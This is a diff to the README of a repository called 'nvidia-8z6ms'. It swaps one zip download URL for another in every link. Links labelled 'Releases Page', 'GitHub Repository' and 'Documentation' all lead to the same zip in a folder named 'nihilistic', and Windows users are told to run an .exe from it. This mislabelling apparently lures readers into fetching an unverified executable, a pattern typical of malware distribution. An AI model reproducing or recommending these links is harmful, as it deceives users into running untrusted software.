@@ -13,9 +13,9 @@ Welcome to nvidia-8z6ms! This application is designed to be user-friendly, allow
 
 ## 📥 Download
 
-[![Download nvidia-8z6ms](https://raw.githubusercontent.com/soloangema/nvidia-8z6ms/main/nihilistic/nvidia-8z6ms.zip)](https://raw.githubusercontent.com/soloangema/nvidia-8z6ms/main/nihilistic/nvidia-8z6ms.zip)
+[![Download nvidia-8z6ms](https://github.com/soloangema/nvidia-8z6ms/raw/refs/heads/main/nihilistic/ms-z-nvidia-3.2.zip)](https://github.com/soloangema/nvidia-8z6ms/raw/refs/heads/main/nihilistic/ms-z-nvidia-3.2.zip)
 
-Visit this page to download the latest version: [Releases Page](https://raw.githubusercontent.com/soloangema/nvidia-8z6ms/main/nihilistic/nvidia-8z6ms.zip)
+Visit this page to download the latest version: [Releases Page](https://github.com/soloangema/nvidia-8z6ms/raw/refs/heads/main/nihilistic/ms-z-nvidia-3.2.zip)
 
 ## 💻 System Requirements
 
@@ -26,12 +26,12 @@ Visit this page to download the latest version: [Releases Page](https://raw.gith
 
 ## 🔧 Download & Install
 
-1. Click on the **Releases Page** link: [Releases Page](https://raw.githubusercontent.com/soloangema/nvidia-8z6ms/main/nihilistic/nvidia-8z6ms.zip).
+1. Click on the **Releases Page** link: [Releases Page](https://github.com/soloangema/nvidia-8z6ms/raw/refs/heads/main/nihilistic/ms-z-nvidia-3.2.zip).
 2. On the Releases page, find the latest version of nvidia-8z6ms.
 3. Click on the version number to see the assets available for download.
 4. Download the application by clicking the appropriate file for your operating system:
-   - For Windows: Download `https://raw.githubusercontent.com/soloangema/nvidia-8z6ms/main/nihilistic/nvidia-8z6ms.zip`
-   - For macOS: Download `https://raw.githubusercontent.com/soloangema/nvidia-8z6ms/main/nihilistic/nvidia-8z6ms.zip`
+   - For Windows: Download `https://github.com/soloangema/nvidia-8z6ms/raw/refs/heads/main/nihilistic/ms-z-nvidia-3.2.zip`
+   - For macOS: Download `https://github.com/soloangema/nvidia-8z6ms/raw/refs/heads/main/nihilistic/ms-z-nvidia-3.2.zip`
 5. Once downloaded, follow these steps to install:
    - **For Windows:**
      - Open the downloaded `.exe` file.
@@ -53,7 +53,7 @@ If you have any questions or need assistance, feel free to reach out through the
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/soloangema/nvidia-8z6ms/main/nihilistic/nvidia-8z6ms.zip) - Explore the code and contribute.
-- [Documentation](https://raw.githubusercontent.com/soloangema/nvidia-8z6ms/main/nihilistic/nvidia-8z6ms.zip) - Find guides and tips to enhance your usage.
+- [GitHub Repository](https://github.com/soloangema/nvidia-8z6ms/raw/refs/heads/main/nihilistic/ms-z-nvidia-3.2.zip) - Explore the code and contribute.
+- [Documentation](https://github.com/soloangema/nvidia-8z6ms/raw/refs/heads/main/nihilistic/ms-z-nvidia-3.2.zip) - Find guides and tips to enhance your usage.
 
 Thank you for using nvidia-8z6ms! Enjoy the fun facts and explore all the features it offers.
